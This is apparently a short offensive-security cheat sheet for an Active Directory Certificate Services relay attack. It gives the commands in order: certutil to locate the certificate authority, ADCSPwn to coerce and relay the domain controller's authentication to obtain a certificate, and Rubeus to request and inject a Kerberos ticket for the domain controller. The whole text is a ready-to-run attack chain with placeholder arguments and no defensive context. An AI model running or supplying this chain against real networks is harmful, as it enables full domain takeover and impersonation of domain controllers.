### source
https://github.com/bats3c/ADCSPwn  

### find certificate autthority
```
certutil.exe
```

### coerce authentication from machine account and relay to certificate service, write certificate to file
```
adcspwn.exe --adcs <certificateAuthority> --remote <domainController> --output <base64Certificate>
```

### request kerberos TGT
```
Rubeus.exe asktgt /outfile:<file> /user:<domainController> /ptt /certificate:<base64Certificate>
```

